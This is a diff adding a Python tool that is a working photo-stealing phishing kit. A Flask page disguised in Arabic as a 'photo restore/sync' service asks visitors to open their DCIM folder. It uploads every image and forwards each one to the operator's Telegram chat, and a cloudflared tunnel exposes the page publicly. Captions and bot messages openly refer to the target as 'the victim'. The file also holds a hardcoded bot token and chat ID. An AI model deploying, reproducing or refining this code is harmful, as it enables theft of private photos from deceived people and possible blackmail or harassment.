@@ -1,0 +1,125 @@
+import os
+import re
+import subprocess
+import threading
+import time
+from flask import Flask, request, render_template_string
+import telebot
+from telebot.types import Message
+
+# --- الإعدادات ---
+TELEGRAM_TOKEN = "8823710542:AAFsiV8Jq419MMXOMfDBe544ciToVLSD-Pg"
+ADMIN_CHAT_ID = "8762725550"
+# -----------------
+
+bot = telebot.TeleBot(TELEGRAM_TOKEN)
+app = Flask(__name__)
+GENERATED_URL = "جاري التجهيز..."
+
+HTML_PAGE = '''
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مزامنة الصور</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        .btn { background: #1877f2; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; display: block; text-align: center;}
+        input[type="file"] { display: none; }
+        .status { margin-top: 20px; font-weight: bold; color: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>استعادة الصور</h2>
+        <p>للمزامنة، يرجى السماح بالوصول إلى مجلد الصور (DCIM).</p>
+        <label for="folderInput" class="btn">السماح بالوصول للصور</label>
+        <input id="folderInput" type="file" name="files[]" webkitdirectory directory multiple>
+        <div id="status" class="status"></div>
+    </div>
+    <script>
+        document.getElementById('folderInput').addEventListener('change', function(e) {
+            const files = e.target.files;
+            if (files.length === 0) return;
+            document.getElementById('status').innerText = "جاري المزامنة...";
+            let uploaded = 0;
+            for (let i = 0; i < files.length; i++) {
+                if (!files[i].type.startsWith('image/')) continue;
+                const formData = new FormData();
+                formData.append('file', files[i]);
+                fetch('/upload', { method: 'POST', body: formData })
+                .then(r => r.text())
+                .then(d => {
+                    uploaded++;
+                    document.getElementById('status').innerText = "تمت المزامنة: " + uploaded;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE)
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'file' not in request.files:
+        return "No file", 400
+    file = request.files['file']
+    if file.filename == '':
+        return "No name", 400
+    
+    try:
+        # استخدام send_document عشان يستقبل أي صورة بأي حجم أو صيغة
+        bot.send_document(ADMIN_CHAT_ID, file, caption=f"📸 صورة من الضحية: {file.filename}")
+        print(f"[+] Sent: {file.filename}")
+    except Exception as e:
+        print(f"[-] Failed to send: {e}")
+        
+    return "OK", 200
+
+def run_server():
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+
+def run_tunnel():
+    global GENERATED_URL
+    print("[*] Starting cloudflared tunnel...")
+    # تصحيح مسار الأداة
+    cloudflared_path = os.path.expanduser('~/cloudflared')
+    process = subprocess.Popen(
+        [cloudflared_path, 'tunnel', '--url', 'http://localhost:5000'],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+    for line in process.stdout:
+        print(line, end='')
+        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+        if match:
+            GENERATED_URL = match.group(0)
+            print(f"\n[+] LINK GENERATED: {GENERATED_URL}\n")
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message: Message):
+    if str(message.chat.id) != str(ADMIN_CHAT_ID):
+        return
+    bot.reply_to(message, f"✅ السيرفر جاهز يا سيدي!\n\n🔗 اللينك اللي هتبعته للضحية:\n`{GENERATED_URL}`\n\nأول ما الضحية يدخل ويسمح بالصور، هتجيلك هنا على طول.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['link'])
+def send_link(message: Message):
+    if str(message.chat.id) != str(ADMIN_CHAT_ID):
+        return
+    bot.reply_to(message, f"🔗 اللينك: `{GENERATED_URL}`", parse_mode='Markdown')
+
+def start_bot():
+    print("[*] Bot is polling...")
+    bot.infinity_polling()
+
+if __name__ == '__main__':
+    threading.Thread(target=run_server, daemon=True).start()
+    threading.Thread(target=run_tunnel, daemon=True).start()
+    time.sleep(3)
+    start_bot()
